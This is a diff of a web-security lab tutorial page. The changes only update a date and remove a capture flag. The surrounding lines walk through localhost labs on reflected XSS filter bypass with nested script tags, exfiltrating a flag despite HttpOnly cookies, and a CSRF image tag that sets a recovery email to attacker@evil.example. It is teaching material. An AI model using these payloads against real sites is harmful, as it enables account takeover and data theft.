@@ -27,7 +27,7 @@
         "name": "h5i"
       },
       "datePublished": "2026-09-15",
-      "dateModified": "2026-10-11",
+      "dateModified": "2026-10-19",
       "image": "https://h5i.dev/_static/social-card.png",
       "inLanguage": "en",
       "isPartOf": {
@@ -82,7 +82,7 @@
 <p>Start the lab:</p>
 <pre><code class="language-bash">$ ./run.sh 20
 $ h5i browser open 'http://127.0.0.1:9200/' \
-  --session lab20 --new --capture
+  --session lab20 --new
 </code></pre>
 <p>The search page reflects its <code>q</code> parameter but removes <code>&lt;script&gt;</code> tags. The filter performs only one replacement, so a nested tag survives its own transformation:</p>
 <pre><code class="language-text">&lt;scr&lt;script&gt;ipt&gt; ... &lt;/script&gt;
@@ -118,7 +118,7 @@ $ h5i websec replay req_0 --session lab20 --create \
 <p>Start the board lab:</p>
 <pre><code class="language-bash">$ ./run.sh 21
 $ h5i browser open 'http://127.0.0.1:9210/' \
-  --session lab21 --new --capture
+  --session lab21 --new
 </code></pre>
 <p>The moderator’s session cookie is <code>HttpOnly</code>, so JavaScript cannot read it through <code>document.cookie</code>. That protects the cookie from direct theft, but the browser still attaches it to same-origin requests.</p>
 <p>Instead of reading the credential, ask the application for the flag and exfiltrate the response:</p>
@@ -142,7 +142,7 @@ $ h5i websec replay req_0 --session lab21 --create \
 <p>Start the lab:</p>
 <pre><code class="language-bash">$ ./run.sh 22
 $ h5i browser open 'http://127.0.0.1:9220/' \
-  --session lab22 --new --capture
+  --session lab22 --new
 </code></pre>
 <p>The recovery-email endpoint changes state through <code>GET</code> and requires no CSRF token. Host an attacker page on the lab’s second origin:</p>
 <pre><code class="language-html">&lt;img src=&quot;http://127.0.0.1:9220/account/recovery-email?email=attacker@evil.example&quot;&gt;
@@ -170,7 +170,7 @@ http://127.0.0.1:9231
 <p>Start the lab and test both an unrelated host and the attacker-controlled second port:</p>
 <pre><code class="language-bash">$ ./run.sh 23
 $ h5i browser open 'http://127.0.0.1:9230/' \
-  --session lab23 --new --capture
+  --session lab23 --new
 
 $ h5i websec replay req_0 --session lab23 --create \
   --set path=/api/me \
@@ -205,7 +205,7 @@ $ h5i websec replay req_0 --session lab23 --create \
 <p>Start the SSO lab:</p>
 <pre><code class="language-bash">$ ./run.sh 24
 $ h5i browser open 'http://127.0.0.1:9240/' \
-  --session lab24 --new --capture
+  --session lab24 --new
 </code></pre>
 <p>The <code>notes</code> client has one registered callback:</p>
 <pre><code class="language-text">http://127.0.0.1:9240/callback
